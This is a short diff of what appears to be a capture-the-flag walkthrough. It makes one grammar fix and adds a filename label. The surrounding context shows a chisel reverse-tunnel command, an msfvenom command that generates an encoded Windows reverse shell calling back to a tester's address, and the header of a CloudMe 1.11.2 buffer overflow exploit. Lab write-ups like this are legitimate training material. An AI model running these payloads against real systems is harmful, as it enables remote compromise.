@@ -327,12 +327,13 @@ C:\xampp\htdocs\gym\upload> C:\Users\public\chisel.exe client 10.10.14.45:8000 R
 
 ```
 
-Downloading the exploit script and replacing the calc.exe shellcode to a reverse shell payload that we generate using msfvenom:
+Downloading the exploit script and replacing the calc.exe shellcode with a reverse shell payload that we generate using msfvenom:
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.45 LPORT=4444 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python
 ```
 
+48389.py:
 
 ```
 # Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
